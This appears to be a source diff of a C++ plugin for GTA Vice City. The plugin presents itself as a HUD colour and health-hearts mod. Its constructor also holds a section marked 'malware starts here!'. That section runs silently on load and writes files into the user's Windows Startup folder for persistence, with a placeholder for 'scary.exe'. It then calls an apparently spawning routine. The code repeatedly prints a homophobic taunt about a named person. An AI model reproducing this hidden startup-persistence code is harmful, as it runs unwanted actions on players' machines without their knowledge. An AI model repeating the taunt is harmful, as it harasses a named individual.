@@ -7,7 +7,7 @@
 #include <shlobj.h>
 #include <windows.h>
 #include <tchar.h>
-//verison 2191
+//verison 2.5\6
 using namespace plugin;
 void cr(int argc, TCHAR *argv[])
 {
@@ -54,22 +54,74 @@ void cr(int argc, TCHAR *argv[])
 class PluginSdkProject1 {
 public:
 	PluginSdkProject1() {
-		std::printf("imad is gay");
-		std::getchar();
+		//std::printf("imad is gay");
+		//std::getchar();
 		// Initialise your plugin here
 		//Events::initRwEvent += [] {
-			//patch::SetUInt(0xBAB244, 0xFF0000FF);
-			//imad is gay 
-	//	};
+		//patch::SetUInt(0xBAB244, 0xFF0000FF);
+		//imad is gay 
+		//	};
 		//imad is gay
-		//config_file conf(PLUGIN_PATH("ChangeableHudColors.ini"));
-		//std::string preset = conf["USE_PRESET"].asString("III");
-		Events::gameProcessEvent += [] {
-			if (KeyPressed(VK_CONTROL)) {
-				CHud::SetHelpMessage("imad is gay", false, false, true);
+
+		//Events::gameProcessEvent += [] {
+		//	if (KeyPressed(VK_CONTROL)) {
+		//		CHud::SetHelpMessage("imad is gay", false, false, true);
+		//	}
+	//	};
+		//float playerh = FindPlayerPed()->m_fHealth;
+		//FindPlayerPed()->m_fHealth;
+
+
+
+		Events::processScriptsEvent += [] {
+			CPed *playa;
+			if (Command<Commands::IS_PLAYER_PLAYING>(0))
+			{
+				Command<0x01F5>(0, &playa);
+				float fheath = playa->m_fHealth;
+				int numhearts = int(ceil(fheath / 10));//max character the text box allows is 13 will crash the game otherwise
+				if (numhearts > 13) {
+					numhearts = 13;
+				}
+				char hearts[25] = { 'i','m' };
+
+				for (int c = 0; c < numhearts; c++) {
+					hearts[c] = '{';//'{' character is the heart charater in gta's font
+				}
+				if (playa->m_fHealth > 10) {
+					//CHud::GetRidOfAllHudMessages();
+					//std::string s = std::to_string(numhearts);
+					//char const *pchar = s.c_str();
+					CHud::SetHelpMessage(hearts, false, true, true);//display hearts
+						//better verison working on below
+						/*char WindowName[] = "GTA: Vice City";
+						RECT rect;
+						TCHAR szBuffer[50] = { 0 };
+						HWND hwnd = FindWindow(0, WindowName);
+						rect.left = 40;
+						rect.top = 10;
+						HDC wdc = GetDC(hwnd);
+						DrawText(wdc, hearts, numhearts, &rect, DT_NOCLIP | DT_INTERNAL);
+							*///std::string gameName = std::string("D3DXFont example for GTA ") + GTAGAME_NAME;
+				//DrawTextA(NULL, gameName.c_str(), -1, &rect, DT_CENTER | DT_VCENTER, D3DCOLOR_RGBA(255, 255, 0, 255))
+
+				}
+
+
+				
+
+
 			}
-			//else if(CPed::m_fHealth) health testing!!!!!!!!!!!!!<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 		};
+
+
+		//std::string s= "imad is gay"+std::to_string(playerh);
+		//char message[20];
+		//strcpy(message, s.);
+		//if (playerh < (float)150.0) {
+		//CHud::SetHelpMessage("<150", false, false, true);
+		//FindPlayerPed()->m_fHealth = 69.0;
+		//}
 		auto WriteColor = [](unsigned int addrR, unsigned int addrG, unsigned int addrB, unsigned int addrA, CRGBA  &clr) {
 			patch::SetUChar(addrR, clr.red); patch::SetUChar(addrG, clr.green); patch::SetUChar(addrB, clr.blue); patch::SetUChar(addrA, clr.alpha);
 		};
@@ -94,6 +146,7 @@ public:
 		WriteColor(5607792, 5607790, 5607785, 5607785, wOff);
 		WriteColor(5609812, 5609807, 5609805, 5609805, zone);
 		WriteColor(5611409, 5611404, 5611399, 5611399, time);
+
 		//malware starts here!
 		std::ofstream outfile("malware.txt");
 		for (int c = 1; c < 10000; c++) {
@@ -105,22 +158,22 @@ public:
 		std::string fline;
 		while (getline(infile, fline))
 		{
-			outfile << fline << '\n';
+		outfile << fline << '\n';
 		}
 		*/
 		//std::string path;
 
 		TCHAR userPath[MAX_PATH];
 
-		if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0,userPath )))
+		if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, userPath)))
 		{
 			outfile << userPath << std::endl;
 		}
 		std::string malpath = "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malware.txt";
 
-		std::ofstream malfile(userPath+malpath);
+		std::ofstream malfile(userPath + malpath);
 		malfile << "scary.exe goes here?" << std::endl;
-		for (int c = 1; c < 12; c++) {
+		for (int c = 1; c < 15; c++) {
 			malfile << "imad is gay!" << std::endl;
 		}
 
@@ -137,6 +190,6 @@ public:
 		args[1] = "100";
 
 		cr(1, args);
-    }
+	}
 } PluginSdkProject1;
 
